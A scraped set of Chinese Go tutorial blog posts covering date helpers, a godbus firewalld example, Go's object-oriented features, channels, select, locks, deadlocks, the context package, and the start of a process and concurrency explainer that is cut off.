如不为0，time包提供了，「以当前时间为基点，进行加减运算」\n// t.AddDate(year, month, date) t.AddDate(0,0,offset) // 可以获取到，周一为几月几日 综上所属，可以获得每周第一天为几月几日，每周随后一天为几月几日\n/** * 获取上周周第一天具体年月日 **/ func GetLastWeekFirstDate() (weekMonday string) { thisWeekMonday := GetFirstDateOfWeek() TimeMonday, _ := time.Parse(\u0026quot;2006-01-02\u0026quot;, thisWeekMonday) lastWeekMonday := TimeMonday.AddDate(0, 0, -7) weekMonday = lastWeekMonday.Format(\u0026quot;2006-01-02\u0026quot;) return } /** * 获取本周的周一具体年月日 **/ func GetFirstDateOfWeek() (weekMonday string) { now := time.Now() offset := int(time.Monday - now.Weekday()) if offset \u0026gt; 0 { offset = -6 } weekStartDate := time.Date(now.Year(), now.Month(), now.Day(), 0, 0, 0, 0, time.Local).AddDate(0, 0, offset) weekMonday = weekStartDate.Format(\u0026quot;2006-01-02\u0026quot;) return } /** * 获取上周最后一天具体年月日 **/ func GetLastWeekLastDate() (weekMonday string) { now := time.Now() offset := int(time.Monday - now.Weekday()) if offset \u0026gt; 0 { offset = -6 } weekStartDate := time.Date(now.Year(), now.Month(), now.Day(), 0, 0, 0, 0, time.Local).AddDate(0, 0, offset) weekMonday = weekStartDate.AddDate(0, 0, -1).Format(\u0026quot;2006-01-02\u0026quot;) return } /** * 获取上周一星期所有天数的具体年月日 **/ func GetBetweenDates(sdate, edate string) []string { d := []string{} timeFormatTpl := \u0026quot;2006-01-02 15:04:05\u0026quot; if len(timeFormatTpl) != len(sdate) { timeFormatTpl = timeFormatTpl[0:len(sdate)] } date, err := time.Parse(timeFormatTpl, sdate) if err != nil { return d } date2, err := time.Parse(timeFormatTpl, edate) if err != nil { return d } if date2.Before(date) { return d } // 输出日期格式固定 timeFormatTpl = \u0026quot;2006-01-02\u0026quot; date2Str := date2.Format(timeFormatTpl) d = append(d, date.Format(timeFormatTpl)) for { date = date.AddDate(0, 0, 1) dateStr := date.Format(timeFormatTpl) d = append(d, dateStr) if dateStr == date2Str { break } } return d } ","permalink":"https://www.oomkill.com/2019/10/golib-timeformat/","summary":"","title":"Go每日一库 - 时间格式化"},{"content":"github https://github.com/godbus/dbus\n增加一个端口\npackage main\rimport (\r\u0026quot;github.com/godbus/dbus/v5\u0026quot;\r)\rfunc main() {\rcli, err := dbus.SystemBus()\rif err != nil {\rpanic(err)\r}\robj := cli.Object(\u0026quot;org.fedoraproject.FirewallD1\u0026quot;, \u0026quot;/org/fedoraproject/FirewallD1\u0026quot;)\rcall := obj.Call(\u0026quot;oorg.fedoraproject.FirewallD1.zone.addPort\u0026quot;, 0, \u0026quot;public\u0026quot;, \u0026quot;81\u0026quot;, \u0026quot;tcp\u0026quot;, \u0026quot;30000\u0026quot;)\rif call.Err != nil {\rpanic(call.Err)\r}\r}\rgo-dbus 简单教程 https://blog.csdn.net/mathmonkey/article/details/38095289\n","permalink":"https://www.oomkill.com/2019/10/golib-gobus/","summary":"","title":"Go每日一库 - 使用go操作dbus"},{"content":"所谓的面向对象其实就是找一个专门做这个事的人来做，不用关心具体怎么实现的。所以说，面向过程强调的是过程，步骤。而面向对象强调的是对象，也就是干事的人。\nGo语言：面向对象语言特性 方法\n嵌入\n接口\n没有类\n支持类型。 特别是， 它支持structs。 Structs是用户定义的类型。 Struct类型(含方法)提供类似于其它语言中类的服务。\nStructs 一个struct定义一个状态。 这里有一个strudent struct。 它有一个Name属性和一个布尔类型的标志Real，告诉我们它是一个真实的strudent还是一个虚构的strudent。 Structs只保存状态，不保存行为。\ntype Creature struct { Name string Real bool } 为结构体添加方法 方法是对特定类型进行操作的函数。 它们有一个接收器条款，命令它们对什么样的类型可进行操作。 这里是一个Hello()方法，它可对student结构进行操作，并打印出它们的状态：\nfunc (s Student) Hello() { fmt.Printf(\u0026quot;Name: '%s', Real: %t\\n\u0026quot;, s.Name, s.Real) } func (s Student) func_name(){} 这是一个不太常见的语法，但是它非常的具体和清晰，不像this的隐喻性。\n一般在定义方法时，需要定义为结构体的指针，值类型的在修改结构体属性时，无法修改其内容\npackage main import \u0026quot;fmt\u0026quot; type human struct { Name string Real bool } type Student struct { human Id int } func (h human) Hello() { fmt.Printf(\u0026quot;姓名：%s\\n\u0026quot;, h.Name) } func (s Student) PrintId() { fmt.Printf(\u0026quot;学号：%d\\n\u0026quot;, s.Id) } func (s Student) EditId(id int) { s.Id = id } func main() { zhangsan := Student{ human: human{\u0026quot;zhangsan\u0026quot;, true}, Id: 10, } zhangsan.Hello() zhangsan.EditId(101) zhangsan.PrintId() } 嵌入（继承） 可以将匿名的类型嵌入进struct。 如果你嵌入一个匿名的struct那么被嵌入的struct对接受嵌入的struct直接提供它自己的状态（和方法）。 比如，strudent 有一个匿名子的被嵌入的 human struct，这意味着一个 student 就是一个 hunman。\npackage main import \u0026quot;fmt\u0026quot; type human struct { Name string Real bool } type Student struct { human Id int } func (h *human) Hello() { fmt.Printf(\u0026quot;姓名：%s\u0026quot;, h.Name) } func main() { zhangsan := \u0026amp;Student{ human: human{\u0026quot;zhangsan\u0026quot;, true}, Id: 10, } zhangsan.Hello() } 重写 就是子类(结构体)中的方法，将父类中的相同名称的方法的功能重新给改写了\n注意：在调用时，默认调用的是子类中的方法\n方法值和表达式值 方法表达式，即方法对象赋值给变量，方法表达式有两种使用方式：\n隐式调用：方法值，调用函数时，无需再传递接收者，隐藏了接收者 显式调用：方法表达式，显示的把接收者*Student传递过去 实例：\npackage main import \u0026quot;fmt\u0026quot; type human struct { Name string Real bool } type Student struct { human Id int } func (h *human) Hello() { fmt.Printf(\u0026quot;姓名：%s\\n\u0026quot;, h.Name) } func (s Student) PrintId() { fmt.Printf(\u0026quot;学号：%d\\n\u0026quot;, s.Id) } func (s Student) EditId(id int) { s.Id = id } func main() { zhangsan := Student{ human: human{\u0026quot;zhangsan\u0026quot;, true}, Id: 10, } // 常规调用 zhangsan.Hello() // 方法值 无需传递接收者 hello := zhangsan.Hello hello() // 方法表达式，调用函数式，传递接收者 hello1 := (*Student).Hello // 括号是因为 . 的优先级要高于取指符，需要做特殊处理 hello1(\u0026amp;zhangsan) } Go语言：面向对象的设计 接口 接口是Go语言对面向对象支持的标志。 接口是声明方法集的类型。 实现所有接口方法的对象自动地实现接口。 它没有继承或子类或 implements 关键字。\n接口的定义 type 接口名字 interface { 方法声明 } 接口的继承 package main import \u0026quot;fmt\u0026quot; type Fooer interface { Foo1() } type Fooerson interface { Fooer Foo2() } type Foo struct { } type Fooson struct { } func (f Fooson) Foo1() { fmt.Println(\u0026quot;Foo1() here\u0026quot;) } func (f Fooson) Foo2() { fmt.Println(\u0026quot;Foo2() here\u0026quot;) } func (f Foo) Foo1() { fmt.Println(\u0026quot;Foo1() here\u0026quot;) } func main() { var fooerson Fooson var fooson Fooerson fooson = \u0026amp;fooerson fooson.Foo1() fooson.Foo2() var foo Fooer foo = fooson fooson = foo // 这样是不允许的，fooson为Fooerson接口的实现，而foo是一个Fooer接口类型的变量，可以子转换为父不能反之 foo.Foo1() } 空接口 空接口(interface{})不包含任何的方法，正因为如此，所有的类型都实现了空接口，因此空接口可以存储任意类型的数值\npackage main import \u0026quot;fmt\u0026quot; func main() { var arr []interface{} arr = append(arr, 1, \u0026quot;zhangsan\u0026quot;, 3.3) fmt.Println(arr) } 类型断言 通过类型断言，可以判断空接口中存储的数据类型。\n语法：value, ok := m.(T)\nm:表空接口类型变量\nT:是断言的类型\nvalue: 变量m中的值。\nok: 布尔类型变量，如果断言成功为true,否则为false\nfunc main() { var a interface{} a = 10 ok, value := a.(int) fmt.Println(ok, value) ok1, value1 := a.(string) fmt.Println(ok1, value1) } 封装 Go语言在包的级别进行封装。 以小写字母开头的名称只在该程序包中可见。 可以隐藏私有包中的任何内容，只暴露特定的类型，接口和工厂函数。\n例如，在这里要隐藏上面的Foo类型，只暴露接口，你可以将其重命名为小写的foo，并提供一个NewFoo()函数，返回公共Fooer接口：\ntype foo struct { } func (f foo) Foo1() { fmt.Println(\u0026quot;Foo1() here\u0026quot;) } func (f foo) Foo2() { fmt.Println(\u0026quot;Foo2() here\u0026quot;) } func (f foo) Foo3() { fmt.Println(\u0026quot;Foo3() here\u0026quot;) } func NewFoo() Fooer { return \u0026amp;Foo{} } 在另一个包的代码可以使用NewFoo()并访问由内部foo类型实现的Footer接口：\nf := NewFoo() f.Foo1() f.Foo2() f.Foo3() 继承 Go语言没有任何类型层次结构。 它允许你通过组合来共享实现的细节。 但Go语言，允许嵌入匿名组合。\n通过嵌入一个匿名类型的组合等同于实现继承，这是它所有意图和目的。 一个嵌入的struct与基类一样脆弱。 你还可以嵌入一个接口， 如果嵌入类型没有实现所有接口方法，它甚至可能导致产生在编译时未被发现的运行错误。\n这里SuperFoo嵌入Fooer接口，但是SuperFoo没有实现Foo的方法。 Go编译器会愉快地让你创建一个新的SuperFood并调用Fooer的方法，但很显然这在运行时会失败。 这会编译：\npackage main import \u0026quot;fmt\u0026quot; type Fooer interface { Foo1() Foo2() Foo3() } type Foo struct { } func (f Foo) Foo1() { fmt.Println(\u0026quot;Foo1() here\u0026quot;) } func (f Foo) Foo2() { fmt.Println(\u0026quot;Foo2() here\u0026quot;) } func (f Foo) Foo3() { fmt.Println(\u0026quot;Foo3() here\u0026quot;) } type SuperFooer struct { Fooer } func main() { s := SuperFooer{} s.Foo3() } 多态 多态性是面向对象编程的本质：只要对象坚持实现同样的接口，Go语言就能处理不同类型的那些对象。 Go接口以非常直接和直观的方式提供这种能力。\nGolang当中的接口解决了这个问题，只要接口中定义的方法能对应的上，那么就可以认为这个类实现了这个接口。同一个接口，使用不同的实例而执行不同操作\npackage main import ( \u0026quot;fmt\u0026quot; ) type animal interface { Say() } type human struct { } type cat struct { } func (h human) Say() { fmt.Println(\u0026quot;人类\u0026quot;) } func (c cat) Say() { fmt.Println(\u0026quot;猫\u0026quot;) } func main() { var a animal a = cat{} a.Say() a = human{} a.Say() } ","permalink":"https://www.oomkill.com/2019/10/go-object/","summary":"","title":"Go面向对象"},{"content":"多路复用 Go语言中提供了一个关键字select，通过select可以监听channel上的数据流动。select的用法与switch语法类似，由select开始一个新的选择块，每个选择条件由case语句来描述。只不过，select的case有比较多的限制，其中最大的一条限制就是每个case语句里必须是一个IO操作。\nselect 语法如下：\nselect { case \u0026lt;-chan1: // 如果chan1成功读到数据，则进行该case处理语句 case chan2 \u0026lt;- 1: // 如果成功向chan2写入数据，则进行该case处理语句 default: // 如果上面都没有成功，则进入default处理流程 } 在一个select语句中，会按顺序从头至尾评估每一个发送和接收的语句；如果其中的任意一语句可以继续执行(即没有被阻塞)，那么就从那些可以执行的语句中任意选择一条来使用。如果没有任意一条语句可以执行(即所有的通道都被阻塞)，那么有两种可能的情况：⑴ 如果给出了default语句，那么就会执行default语句，同时程序的执行会从select语句后的语句中恢复。⑵ 如果没有default语句，那么select语句将被阻塞，直到至少有一个channel可以进行下去。\n在一般的业务场景下，select不会用default，当监听的流中再没有数据，IO操作就 会阻塞现象，如果使用了default，此时可以出让CPU时间片。如果使用了default 就形成了非阻塞状态，形成了忙轮训，会占用CPU、系统资源。\n阻塞与非阻塞使用场景\n阻塞： 如：在监听超时退出时，如果100秒内无操作，择退出，此时添加了default会形成忙轮训，超时监听变成了无效。 非阻塞： 如，在一个只有一个业务逻辑处理时，主进程控制进程的退出。此时可以使用default。 定时器 Go语言中定时器的使用有三个方法\ntime.Sleep() time.NewTimer() 返回一个时间的管道， time.C 读取管道的内容 time.After(5 * time.Second) 封装了time.NewTimer()，反回了一个 time.C的管道 示例\nselect { case \u0026lt;-time.After(time.Second * 10): } 锁和条件变量 Go语言中为了解决协程间同步问题，提供了标准库代码，包sync和sync/atomic中。\n互斥锁 互斥锁是传统并发编程对共享资源进行访问控制的主要手段，它由标准库sync中的Mutex结构体类型表示。sync.Mutex类型只有两个公开的指针方法，Lock和Unlock。Lock锁定当前的共享资源，Unlock进行解锁。\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;runtime\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;time\u0026quot; ) var mutex sync.Mutex func print(str string) { mutex.Lock() // 添加互斥锁 defer mutex.Unlock() // 使用结束时解锁 for _, data := range str { // 迭代器 fmt.Printf(\u0026quot;%c\u0026quot;, data) time.Sleep(time.Second) // 放大协程竞争效果 } fmt.Println() } func main() { go print(\u0026quot;hello\u0026quot;) // main 中传参 go print(\u0026quot;world\u0026quot;) for { runtime.GC() } } 读写锁 读写锁的使用场景一般为读多写少，可以让多个读操作并发，同时读取，但是对于写操作是完全互斥的。也就是说，当一个goroutine进行写操作的时候，其他goroutine不能进行读写操作；当一个goroutine获取读锁之后，其他的goroutine获取写锁都会等待\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;time\u0026quot; ) var count int // 全局变量count var rwlock sync.RWMutex // 全局读写锁 rwlock func read(n int) { for { rwlock.RLock() fmt.Printf(\u0026quot;reading goroutine %d ...\\n\u0026quot;, n) num := count fmt.Printf(\u0026quot;read goroutine %d finished，get number %d\\n\u0026quot;, n, num) rwlock.RUnlock() } } func write(n int) { for { rwlock.Lock() fmt.Printf(\u0026quot;writing goroutine %d ...\\n\u0026quot;, n) num := rand.Intn(1000) count = num fmt.Printf(\u0026quot;write goroutine %d finished，write number %d\\n\u0026quot;, n, num) rwlock.Unlock() } } func main() { for i := 0; i \u0026lt; 5; i++ { go read(i + 1) time.Sleep(time.Microsecond * 100) } for i := 0; i \u0026lt; 5; i++ { go write(i + 1) time.Sleep(time.Microsecond * 100) } for { } } 可以看出，读写锁控制下的多个写操作之间都是互斥的，并且写操作与读操作之间也都是互斥的。但是，多个读操作之间不存在互斥关系。\nGo语言中的死锁 死锁 deadlock 是指两个或两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁。\n单gorutine同时读写，写死锁 在一个gorutine中，当channel无缓冲，写阻塞，等待读取导致死锁\n解决，应该至少在2个gorutine进行channle通讯，或者使用缓冲区。\npackage main func main() { channel := make(chan int) channel \u0026lt;- 1 \u0026lt;-channel } 多gorutine使用一个channel通信，写先于读 代码顺序执行时，写操作阻塞，导致后面协程无法启动进行读操作，导致死锁\npackage main func main() { channel := make(chan int) channel \u0026lt;- 1 go func() { \u0026lt;-channel }() } 多channel交叉死锁 在goroutine中，多个goroutine使用多个channel互相等待对方写入，导致死锁\npackage main func main() { channel1 := make(chan int) channel2 := make(chan int) go func() { select { case \u0026lt;-channel1: channel2 \u0026lt;- 1 } }() select { case \u0026lt;-channel2: channel1 \u0026lt;- 1 } } 隐性死锁 尽量不要将 互斥锁、读写锁 与 channel 混用情况下，让读先进行读时，因为没写入被阻塞，无法解除。写入时，因为没有读出被阻塞，锁无法解除，导致无数据输出，形成隐形死锁。此时编译器是不报错的。\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;sync\u0026quot; ) func main() { channel := make(chan int) var rwlock sync.RWMutex go func() { for { rwlock.Lock() channel \u0026lt;- 1 fmt.Println(\u0026quot;write\u0026quot;, 1) rwlock.Unlock() } }() go func() { for { rwlock.RLock() n := \u0026lt;-channel fmt.Println(n) rwlock.Unlock() } }() for { } } Context 上下文 context定义了上下文类型，该类型在API边界之间以及进程之间传递截止时间，取消信号和其他请求范围的值。当在对请求传入一个上下文，可以选择将其替换为使用WithCancel，WithDeadline，WithTimeout。在取消后，从该context处派生的所有子请求也会被取消。\nContext的结构体\nDeadline() 返回context的截止时间。 Done() 返回一个channle，当timeout或cancelfuc将会close(chan) Err() 返回错误，未关闭Done()返回nil，取消，返回 \u0026quot;context canceled\u0026quot;, Deadline返回超时 Value 返回值。 type Context interface { // Deadline returns the time when work done on behalf of this context // should be canceled. Deadline returns ok==false when no deadline is // set. Successive calls to Deadline return the same results. Deadline() (deadline time.Time, ok bool) // Done returns a channel that's closed when work done on behalf of this // context should be canceled. Done may return nil if this context can // never be canceled. Successive calls to Done return the same value. // The close of the Done channel may happen asynchronously, // after the cancel function returns. // // WithCancel arranges for Done to be closed when cancel is called; // WithDeadline arranges for Done to be closed when the deadline // expires; WithTimeout arranges for Done to be closed when the timeout // elapses. // // Done is provided for use in select statements: // // // Stream generates values with DoSomething and sends them to out // // until DoSomething returns an error or ctx.Done is closed. // func Stream(ctx context.Context, out chan\u0026lt;- Value) error { // for { // v, err := DoSomething(ctx) // if err != nil { // return err // } // select { // case \u0026lt;-ctx.Done(): // return ctx.Err() // case out \u0026lt;- v: // } // } // } // // See https://blog.golang.org/pipelines for more examples of how to use // a Done channel for cancellation. Done() \u0026lt;-chan struct{} // If Done is not yet closed, Err returns nil. // If Done is closed, Err returns a non-nil error explaining why: // Canceled if the context was canceled // or DeadlineExceeded if the context's deadline passed. // After Err returns a non-nil error, successive calls to Err return the same error. Err() error // Value returns the value associated with this context for key, or nil // if no value is associated with key. Successive calls to Value with // the same key returns the same result. // // Use context values only for request-scoped data that transits // processes and API boundaries, not for passing optional parameters to // functions. // // A key identifies a specific value in a Context. Functions that wish // to store values in Context typically allocate a key in a global // variable then use that key as the argument to context.WithValue and // Context.Value. A key can be any type that supports equality; // packages should define keys as an unexported type to avoid // collisions. // // Packages that define a Context key should provide type-safe accessors // for the values stored using that key: // // // Package user defines a User type that's stored in Contexts. // package user // // import \u0026quot;context\u0026quot; // // // User is the type of value stored in the Contexts. // type User struct {...} // // // key is an unexported type for keys defined in this package. // // This prevents collisions with keys defined in other packages. // type key int // // // userKey is the key for user.User values in Contexts. It is // // unexported; clients use user.NewContext and user.FromContext // // instead of using this key directly. // var userKey key // // // NewContext returns a new Context that carries value u. // func NewContext(ctx context.Context, u *User) context.Context { // return context.WithValue(ctx, userKey, u) // } // // // FromContext returns the User value stored in ctx, if any. // func FromContext(ctx context.Context) (*User, bool) { // u, ok := ctx.Value(userKey).(*User) // return u, ok // } Value(key interface{}) interface{} } 演示使用可取消的上下文。可在函数结束时defer cancel() 防止goroutine的泄露。\npackage main import ( \u0026quot;context\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;time\u0026quot; ) func worker(ctx context.Context, name string) { n := 0 for { select { case \u0026lt;-ctx.Done(): fmt.Println(name, \u0026quot;去划水了\u0026quot;, n) return default: fmt.Println(name, \u0026quot;干活中\u0026quot;, n) time.Sleep(time.Second) } n++ } } func main() { ctx, cancel := context.WithCancel(context.Background()) for n := 0; n \u0026lt; 5; n++ { go worker(ctx, fmt.Sprintf(\u0026quot;worker%d\u0026quot;, n)) } \u0026lt;-time.After(time.Second * 5) cancel() for { } } 超时处理，WithTimeout 当时间到达设置的时间后退出，也可以使用cancelFunc()退出处理\npackage main import ( \u0026quot;context\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;time\u0026quot; ) func worker(ctx context.Context, name string) { n := 0 for { select { case \u0026lt;-ctx.Done(): fmt.Println(name, \u0026quot;去划水了\u0026quot;, n) return default: fmt.Println(name, \u0026quot;干活中\u0026quot;, n) time.Sleep(time.Second) } n++ } } func main() { //ctx, cancel := context.WithCancel(context.Background()) ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second) for n := 0; n \u0026lt; 2; n++ { go worker(ctx, fmt.Sprintf(\u0026quot;worker%d\u0026quot;, n)) } \u0026lt;-time.After(time.Second * 5) fmt.Println(\u0026quot;取消了\u0026quot;) cancel() } WithDeadline，在标准库中可以看出，实际上WithTimeout是封装了WithDeadline。其功能也是超时退出。\npackage main import ( \u0026quot;context\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;time\u0026quot; ) func worker(ctx context.Context, name string) { n := 0 for { select { case \u0026lt;-ctx.Done(): fmt.Println(name, \u0026quot;去划水了\u0026quot;, n) fmt.Println(ctx.Err()) return default: fmt.Println(name, \u0026quot;干活中\u0026quot;, n) time.Sleep(time.Second) } n++ } } func main() { ctx, cancel := context.WithDeadline(context.Background(), time.Now().Add(time.Second*3)) for n := 0; n \u0026lt; 2; n++ { go worker(ctx, fmt.Sprintf(\u0026quot;worker%d\u0026quot;, n)) } \u0026lt;-time.After(time.Second * 5) fmt.Println(\u0026quot;取消了\u0026quot;) cancel() } Context总结 Context是Go语言在1.7中加入标准库的，是作为Goroutine线程安全，防止线程泄露的上下文管理的操作。 context包的核心是Context结构体。 Context的常用方法为 WithTimeout() 与 WithCancel() Context在使用时，不要放在结构体内使用，要以函数的参数进行传递。 Context是线程安全的，可以在多个Goroutine传递，当对其取消操作时，所有Goroutine都执行取消操作。 ","permalink":"https://www.oomkill.com/2019/10/go-goroutine-security/","summary":"","title":"Go协程安全"},{"content":" channel是Go语言中的一个核心数据类型，channel是一个数据类型，主要用来解决协程的同步问题以及协程之间数据共享（数据传递）的问题。在并发核心单元通过它就可以发送或者接收数据进行通讯，这在一定程度上又进一步降低了编程的难度。\ngoroutine运行在相同的内存地址空间，channel可以避开所有内存共享导致的坑；通道的通信方式保证了同步性。数据通过channel：同一时间只有一个协程可以访问数据：所以不会出现数据竞争，确保并发安全。\nchannel的定义 channel是对应make创建的底层数据结构的引用。 创建语法： make(chan Type, capacity)\nchannel := make(chan bool) //创建一个无缓冲的bool型Channel\u2028，等价于make(chan Type, 0) channel := make(chan bool, 1024) //创建一个有缓冲，切缓冲区为1024的bool型Channel\u2028channel \u0026lt;- x //向一个Channel发送一个值 \u0026lt;- channel //从一个Channel中接收一个值 x = \u0026lt;- channel //从Channel c接收一个值并将其存储到x中 x, ok = \u0026lt;- channel //从Channel接收一个值，如果channel关闭了或没有数据，那么ok将被置为false channel是一个引用类型，当复制一个channel或用于函数参数传递时，我们只是拷贝了一个channel引用，因此调用者和被调用者将引用同一个channel对象。和其它的引用类型一样，channel的零值（定义未初始化）也是nil。\n在默认情况下，channel接收和发送数据都是阻塞的，（channel \u0026lt;- 1，写端写数据，读端不在读。写端阻塞； str := \u0026lt;-channel 读端读数据， 同时写端不在写，读端阻塞。）除非另一端已经准备好，这样就使得goroutine同步变的更加的简单，而不需要显式的lock。\n示例\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;runtime\u0026quot; \u0026quot;time\u0026quot; ) var c = make(chan int32) func printstr(s string) { for _, value := range s { fmt.Printf(\u0026quot;写入%+q\\r\\n\u0026quot;, value) time.Sleep(time.Second) c \u0026lt;- value } } func main() { runtime.GOMAXPROCS(1) go func() { time.Sleep(time.Second) printstr(\u0026quot;hello\u0026quot;) }() go func() { for v := range c { fmt.Printf(\u0026quot;读取%+q\\r\\n\u0026quot;, v) } }() for { ; } } channel的缓冲 无缓冲的channel 无缓冲的channel unbuffered channel 是指在接收前没有能力保存任何值的通道。这种类型的channel 要求发送端和接收端同时准备好，才能完成发送和接收操作。否则，通道会导致先执行发送或接收操作的阻塞等待。顾又称为同步通信\n阻塞：由于某种原因数据没有到达，当前协程（线程）持续处于等待状态，直到条件满足，才接触阻塞。 同步：在两个或多个协程（线程）间，保持数据内容一致性的机制。 示例如上，写了没有读会导致阻塞，读了没有写会导致堵塞\n有缓冲的channel 有缓冲的通道（buffered channel）是一种在被接收前能存储一个或者多个数据值的通道。这种类型的channel并不强制要求goroutine之间必须同时完成发送和接收。通道会阻塞发送和接收动作的条件也不同。\n只有channel通道中没有要接收的值时，接收动作才会阻塞。 只有通道没有可用缓冲区容纳被写入（发送）的值时，发送动作才会阻塞。 有缓冲的channel和无缓冲的channel之间的不同：无缓冲的channel保证进行发送和接收的 goroutine 会在同一时间进行数据交换；有缓冲的channel没有这种保证。\n示例\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;runtime\u0026quot; \u0026quot;time\u0026quot; ) var c = make(chan int32, 10) func printstr(s string) { for _, value := range s { fmt.Printf(\u0026quot;写入%+q\\r\\n\u0026quot;, value) c \u0026lt;- value } } func main() { runtime.GOMAXPROCS(1) go func() { printstr(\u0026quot;hello\u0026quot;) }() go func() { time.Sleep(time.Second * 2) fmt.Println(\u0026quot;读通道开始读取数据\u0026quot;) for v := range c { fmt.Printf(\u0026quot;读取%+q\\r\\n\u0026quot;, v) } }() for { } } 结果可以看出，如果给定了一个缓冲区容量，channel就是异步的。只要缓冲区有未使用空间用于发送数据，或还包含可以接收的数据，那么其通信就会无阻塞地进行。\nchannel的关闭 当发送的一端没有更多的数据发送到channel的话，需要使接收端也能及时知道channel中没有多余的数据可以接收。因此可以通过 close()函数来关闭channel的实现。\n示例\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;runtime\u0026quot; \u0026quot;time\u0026quot; ) var c = make(chan int32, 10) func printstr(s string) { for _, value := range s { fmt.Printf(\u0026quot;写入%+q\\r\\n\u0026quot;, value) c \u0026lt;- value } close(c) } func main() { runtime.GOMAXPROCS(1) go func() { printstr(\u0026quot;hello\u0026quot;) }() time.Sleep(time.Second * 2) fmt.Println(\u0026quot;读通道开始读取数据\u0026quot;) for { if char, ok := \u0026lt;-c; ok { fmt.Printf(\u0026quot;读取%+q\\r\\n\u0026quot;, char) } else { break } } } 提示\nchannel不像文件一样需要经常去关闭，只有当你确实没有任何发送数据了，或者你想显式的结束range循环之类的，才去关闭channel； 关闭channel后，无法向channel 再发送数据(引发 panic 错误后导致接收立即返回零值)； 关闭channel后，可以继续从channel接收数据（读取到的数据为channel类型的默认值，如int默认值0 string默认值\u0026quot;\u0026quot;）； 对于nil channel，无论收发都会被阻塞。 缓冲channel 和 非缓冲channel的区别 缓冲channel的创建方式为make(chan TYPE,CAPCTIY)，非缓冲channel的创建方式为make(chan TYPE) 缓冲channel的通信方式为同步通信，非缓冲channel的通信方式为异步通信 单项channel及应用 默认情况下，channel是双向的，既可以往里面发送数据也可以接收数据。但是，常将channel作为参数进行传递而只希望对方是单向使用的，要么只让它发送数据，要么只让它接收数据，这时候可以指定通道的方向。\n单项channel的声明 双向channel ch = make(chan int) 单向写channel: var ch chan \u0026lt;- int ch = make(chan \u0026lt;- int) 单向读channel:\tvar ch \u0026lt;- chan int ch = make(\u0026lt;-chan int) 可以将 channel 隐式转换为单向队列，只收或只发，不能将单向 channel 转换为普通 channel，示例：\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;runtime\u0026quot; ) var c = make(chan string, 10) func read(c \u0026lt;-chan string) { fmt.Println(\u0026quot;读通道开始读取数据\u0026quot;) for { if char, ok := \u0026lt;-c; ok { fmt.Printf(\u0026quot;读取%s\\r\\n\u0026quot;, char) } else { break } } } func write(ch chan\u0026lt;- string, str []string) { defer close(ch) for _, value := range str { fmt.Printf(\u0026quot;写入%+q\\r\\n\u0026quot;, value) ch \u0026lt;- value } } func main() { runtime.GOMAXPROCS(3) go write(c, []string{\u0026quot;h\u0026quot;, \u0026quot;e\u0026quot;, \u0026quot;l\u0026quot;, \u0026quot;l\u0026quot;, \u0026quot;o\u0026quot;}) read(c) } ","permalink":"https://www.oomkill.com/2019/10/go-goroutine-communication/","summary":"","title":"Go协程通讯"},{"content":"并行和并发 并发编程是指在一台处理器上“同时”处理多个任务。\n宏观并发：在一段时间内，有多个程序在同时运行。\n微观并发：在同一时刻只能有一条指令执行，但多个程序指令被快速的轮换执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，使多个程序快速交替的执行。\n并行 parallel：同一时刻，多条指令在多个处理器上同时执行。\n并发 concurrency：在同一时刻只能有一条指令执行，但多个进程指令被快速的轮换执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，通过cpu时间片轮转使多个进程快速交替的执行。\n通俗来讲，并行是两组队列同时使用一个进程；并发是两个队列分别交替使用两个进程\n进程并发 程序，以Go语言为例，是指编译好的二进制文件，在磁盘上，不占用系统资源(cpu、内存、打开的文件、设备、锁\u0026hellip;.)\n进程，是一个抽象的概念，与操作系统原理联系紧密。以Go语言为例，将编译好的程序运行起来，在内存空间中形成一个独立的内存体，内存体有自己的独立空间，上级挂靠单位是操作系统。\n进程是操作系统进行资源分配和调度的一个独立单位，一般由程序，数据集合和进程控制块三部分组成。\n程序：描述进程完成的功能，是控制进程执行的指令集； 数据集合：程序在执行时所需要的数据和工作区； 程序控制块PCB：Program Control Block，包含进程的描述信息和控制信息，是进程存在的唯一标志。 进程是活跃的程序，占用系统资源。在内存中执行。同一个程序也可以加载为不同的进程(彼此之间互不影响)\n进程状态 进程基本的状态有5种。分别为初始态，就绪态，运行态，挂起态与终止态。其中初始态为进程准备阶段，常与就绪态结合来看。\n线程的任务调度 大部分操作系统的任务调度是采用时间片轮转的抢占式调度方式。\n时间片轮转是指，在一个进程中，当线程任务执行几毫秒后，由操作系统内核进行调度，通过硬件计数器终端处理器，让线程强行暂停，并将该线程的寄存器放入内存中，通过查看线程列表决定接下来执行哪一个线程，并从内存中恢复该线程的寄存器，最后恢复该线程的执行，从而去执行下一个任务。\n在时间片轮转中，任务执行那段时间叫做时间片，任务正在执行时的状态叫运行状态，被暂停的线程任务状态叫做就绪状态，意为等待下一个属于它的时间片的到来。\n由于CPU的执行效率非常高，（i5 6600 约200亿/秒，奔腾4 约13亿/秒）CPU preformance 时间片非常短，在各个任务之间快速地切换，给人的感觉就是多个任务在“同时进行”，这也就是我们所说的并发。多任务运行过程的示意图如下：\n进程实现并发时会出现的问题呢 孤儿进程: 父进程先于子进程结束，则子进程成为孤儿进程，子进程的父进程成为init进程，称为init进程领养孤儿进程。\n僵尸进程: 进程终止，父进程尚未回收，子进程残留资源（PCB）存放于内核中，变成僵尸（Zombie）进程。\n线程并发 在早期操作系统当中，没有线程的概念，进程是最小分配资源与执行单位，可以看做是一个进程中只有一个线程，故进程即线程。所以线程LWP被称为：：Lightweight 